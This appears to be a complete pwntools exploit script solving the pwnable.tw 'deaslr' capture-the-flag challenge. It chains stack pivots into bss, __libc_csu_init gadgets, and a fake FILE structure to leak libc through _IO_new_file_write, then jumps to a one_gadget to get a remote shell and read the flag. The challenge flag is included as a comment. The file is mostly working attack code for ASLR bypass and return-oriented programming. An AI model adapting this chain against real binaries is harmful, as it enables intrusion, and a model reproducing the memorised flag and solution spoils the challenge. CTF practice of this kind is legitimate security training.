#!/usr/bin/env python3

from pwn import *

exe = ELF('./deaslr_patched')
libc = ELF('./libc_64.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *main + 20
b *__libc_csu_init+73
'''

p = remote("chall.pwnable.tw", 10402)
#p = process('./deaslr_patched')
#p = gdb.debug('./deaslr_patched', gdbscript = script)
#debug()

main = 0x000000000040053e
pop_rdi = 0x4005c3
pop_rsi_r15 = 0x4005c1
gets_plt = exe.plt['gets']
pop_rbp = 0x4004a0
leave_ret = 0x400554
ret = leave_ret + 1
pop_rbx_rbp_r12_r13_r14_r15 = 0x00000000004005ba
call_gadget = 0x00000000004005a9
gets_got = exe.got['gets']

# pivot things
payload = b"A" * 0x10 + p64(0x601800) + p64(main)
sl(payload)
payload = b"A" * 0x10 + p64(0x601820) + p64(main)
sl(payload)
## now botth rsp and rbp are in bss

# uninitalized ptr
payload = b"A" * 0x10 + p64(0x601a00) + p64(ret) * 6 + p64(main) 
sl(payload)
'''
now _IO_2_1_stdin_ at 0x6017b8:
0x6017a0:       0x0000000000000000      0x0000000000000000
0x6017b0:       0x0000000000000000      0x00007ff8ed95d8e0
0x6017c0:       0x0000000000601810      0x0000000000000000
'''

# Flow: R1 -> R2 -> R3 -> R4 -> trigger -> rop: pop rbx && pop r12... -> rop: call gadget && ret2main -> last round

# R1 write rop
payload = b"B" * 0x10 + p64(0)
payload += p64(pop_rdi) + p64(0x601100) + p64(gets_plt) # prepare fake struct (to help _IO_new_file_write works normally) (R2)
payload += p64(pop_rdi) + p64(0x6017d8) + p64(gets_plt) # prepare a ROP after we claim libc value (R3)
payload += p64(pop_rdi) + p64(0x601798) + p64(gets_plt) # prepare __libc_csu_init gadgets right before libc value (R4)
payload += p64(pop_rbp) + p64(0x601798) + p64(leave_ret) # trigger (!!!!)
sl(payload)

# R2 prepare fake struct
## pwndbg> x/20i _IO_file_write
payload = p8(0) * 0x70 + p32(1) + p32(2)
sl(payload)

# R3 prepare rop chain: call gadget to leak libc and ret2main
payload = p64(pop_rdi) + p64(0x601100) + p64(pop_rsi_r15) + p64(gets_got) + p64(0) + p64(pop_rbp) + p64(0xfffffffffffffdcf + 1) + p64(call_gadget) # call gadget to leak libc
# set rbp = rbx + 1 to prevent jne instruction
# set rdi = fake struct, rsi = gets_got
# and call _IO_new_file_write
payload += p64(0) * 2 + p64(0x601c00) + p64(0) * 4 + p64(main) # pop rbx, rbp, r12, ... and ret2main 
sl(payload)

# R4 prepare rop chain: pop rbx and r12 and other (not important) registers
payload = b"C" * 8 + p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(0xfffffffffffffdcf) # csu_init gadgets (b2)
# rbx = 0xfffffffffffffdcf
# r12 = _IO_2_1_stdin_
# qword ptr [r12 + rbx * 8] = _IO_new_file_write
sl(payload)

# last round: ret 2 one_gadget
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['gets']
lleak("libc base", libc_base)
one_gadget = libc_base + 0xf0567
payload = b"D" * 0x10 + p64(0) + p64(one_gadget)
sl(payload)

sl(b"cat /home/deaslr/flag")

p.interactive()
#FLAG{R0P_H4rd_TO_D3F3AT_ASLR}
